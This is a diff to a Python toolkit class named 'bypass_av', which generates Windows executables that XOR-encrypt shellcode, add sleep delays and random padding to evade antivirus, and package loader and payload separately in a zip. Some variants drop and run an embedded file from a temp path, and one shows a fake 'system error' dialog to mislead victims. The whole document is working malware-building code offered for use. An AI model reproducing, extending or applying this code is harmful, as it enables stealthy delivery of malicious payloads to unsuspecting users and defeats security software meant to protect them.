@@ -128,7 +128,10 @@ def wt(file_path='@@@bin@@@', mode='wb', encoding='utf-8'):
     
 def wtz(file_path='@@@bin@@@', mode='a'):
     import zipfile
-    return lambda name, data:zipfile.ZipFile(file_path, mode).writestr(name, data, compress_type=None, compresslevel=None)
+    def put_file(name, data):
+        zipfile.ZipFile(file_path, mode).writestr(name, data, compress_type=None, compresslevel=None)
+        return put_file
+    return put_file
     
 def pp(*command):
     import subprocess
@@ -1317,6 +1320,20 @@ class bypass_av(object):
         return ret
         
     b2cs = bytes_to_c_str
+    
+    @staticmethod
+    def pack(*slots):
+        return p32(0)+b''.join([slot+p32(len(slot)) for slot in slots])
+        
+    @staticmethod
+    def unpack(data):
+        bs = bio(data[::-1])
+        slots = []
+        slot_size = u32(bs.read(4)[::-1])
+        while slot_size:
+            slots.append(bs.read(slot_size)[::-1])
+            slot_size = u32(bs.read(4)[::-1])
+        return slots[::-1]
         
     @staticmethod
     def single_exe(sc, icon=None, sleep=2000, modify=None, libs=None):
@@ -1324,6 +1341,9 @@ class bypass_av(object):
             src = rd(r'D:\tools\bin\Lib\file_templete\bypass_av_single_exe.cpp', 'r')
         else:
             src = bav.src
+            
+        if modify:
+            src = modify(src)
             
         sc_key = rand_bytes(rand_int(16, 32))
         sc = exor(sc, sc_key)
@@ -1334,17 +1354,33 @@ class bypass_av(object):
         src = src.replace('@@@slot_0@@@', str(sleep))
         src = src.replace('@@@slot_1@@@', slot_1)
         src = src.replace('@@@slot_3@@@', str(rand_int(0, 0x1000)))
+        src = src.replace('@@@slot_4@@@', 'NULL')
         
-        if modify:
-            src = modify(src)
         if not libs:
             libs=['shlwapi']
         else:
             libs=['shlwapi']+libs
         wt('@@@cc_shell_src@@@', 'w')(src)
-        return bav.gen(src, icon, libs)+p32(0)+sc+p32(len(sc))
+        return bav.gen(src, icon, libs)+bav.pack(sc)
     
     se = single_exe
+    
+    @staticmethod
+    def single_exe_seperate(sc, icon=None, db_name='config.db', sleep=2000, modify=None, libs=None):
+        def modify_(src):
+            if modify:
+                src = modify(src)
+            src = src.replace('@@@slot_4@@@', 'L"{}"'.format(db_name))
+            return src
+        pe_data = bav.single_exe(sc, icon=None, sleep=2000, modify=modify_, libs=None)
+        sc_data = bav.pack(bav.unpack(pe_data)[0])
+        pe_data = pe_data[0:len(pe_data)-len(sc_data)]
+        wtz('@@@bav_sex@@@')('shell.exe', pe_data)(db_name, sc_data)
+        zip_data = rd('@@@bav_sex@@@')
+        rm('@@@bav_sex@@@')
+        return zip_data
+        
+    sex = single_exe_seperate
     
     @staticmethod
     def extract_and_exec_file_from_single_exe(sc, icon=None, file_tuple=None, sleep=2000, modify=None, libs=None):
@@ -1359,9 +1395,9 @@ class bypass_av(object):
         slot_2 += r'decode(file_data, file_size, {}, {});'.format(bav.b2cs(file_key), str(len(file_key))) + '\n'
         slot_2 += r'write_temp_file_and_exec((unsigned char *)file_data, file_size, L"{}");'.format(file_ext_name) + '\n'
         def modify_(src):
-            src = src.replace('@@@slot_2@@@', slot_2)
             if modify:
                 src = modify(src)
+            src = src.replace('@@@slot_2@@@', slot_2)
             return src
         
         return bav.single_exe(sc, icon, sleep, modify_, libs)+file_bytes+p32(len(file_bytes))
@@ -1374,9 +1410,9 @@ class bypass_av(object):
             msg_tuple = [b'\xe7\xb3\xbb\xe7\xbb\x9f\xe9\x94\x99\xe8\xaf\xaf'.decode(), b'\xe7\x94\xb1\xe4\xba\x8e\xe6\x89\xbe\xe4\xb8\x8d\xe5\x88\xb0api-ms-win-core-delayload-l1-1-0.dll, \xe6\x97\xa0\xe6\xb3\x95\xe7\xbb\xa7\xe7\xbb\xad\xe6\x89\xa7\xe8\xa1\x8c\xe4\xbb\xa3\xe7\xa0\x81, \xe9\x87\x8d\xe6\x96\xb0\xe5\xae\x89\xe8\xa3\x85\xe7\xa8\x8b\xe5\xba\x8f\xe5\x8f\xaf\xe8\x83\xbd\xe4\xbc\x9a\xe8\xa7\xa3\xe5\x86\xb3\xe6\xad\xa4\xe9\x97\xae\xe9\xa2\x98\xe3\x80\x82'.decode()]
         slot_2 = rf'MessageBoxW(NULL, L"{msg_tuple[1]}", L"{msg_tuple[0]}", MB_ICONERROR|MB_OK);'
         def modify_(src):
-            src = src.replace('@@@slot_2@@@', slot_2)
             if modify:
                 src = modify(src)
+            src = src.replace('@@@slot_2@@@', slot_2)
             return src
         
         return bav.single_exe(sc, icon, sleep, modify_, libs)
